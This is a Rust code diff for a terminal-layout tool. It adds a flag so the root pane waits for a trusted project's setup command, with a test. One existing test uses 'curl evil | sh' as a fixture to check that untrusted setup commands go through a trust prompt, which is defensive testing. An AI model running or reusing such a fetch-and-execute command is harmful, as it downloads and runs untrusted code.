@@ -31,6 +31,8 @@ pub(crate) struct Build {
     pub(crate) warnings: Vec<String>,
     /// The project's `setup`, only when its commands may run.
     pub(crate) setup: Option<String>,
+    /// `setupPolicy: "wait"` of the project file: the root pane's command waits for `setup`.
+    pub(crate) setup_wait: bool,
     /// The request's `env` for every terminal built.
     pub(crate) env: std::collections::BTreeMap<String, String>,
 }
@@ -188,11 +190,14 @@ pub(crate) fn prepare(
     let setup = (allow && preset.is_none())
         .then(|| project::setup_of(sources.refs().0))
         .flatten();
+    let setup_wait =
+        setup.is_some() && project::setup_policy_of(sources.refs().0) == project::SetupPolicy::Wait;
     Ok(Prepared::Build(Build {
         dir: cwd.to_owned(),
         layout,
         warnings,
         setup,
+        setup_wait,
         env: Default::default(),
     }))
 }
@@ -318,6 +323,21 @@ mod tests {
         assert_eq!(asked.hash, trust::sha256_hex(&changed));
         assert!(asked.commands.iter().any(|c| c.command == "curl evil | sh"));
         assert_eq!(d.config_text(), "");
+    }
+
+    #[test]
+    fn setup_policy_wait_is_carried_only_with_a_setup_that_may_run() {
+        let d = Dirs::new("wait");
+        d.project(r#"{"setup": "make deps", "setupPolicy": "wait", "layout": {"panes": [{"name": "dev", "command": "x"}]}}"#);
+        let Prepared::Ask(q) = prepare_in(&d, None) else {
+            panic!("expected a trust question")
+        };
+        let answer = TrustAnswer::Trust { hash: q.hash };
+        assert!(build(prepare_in(&d, Some(&answer))).setup_wait);
+        let d = Dirs::new("wait-without");
+        d.project(r#"{"setup": "make deps", "setupPolicy": "wait"}"#);
+        let without = build(prepare_in(&d, Some(&TrustAnswer::Without)));
+        assert!(!without.setup_wait && without.setup.is_none());
     }
 
     #[test]
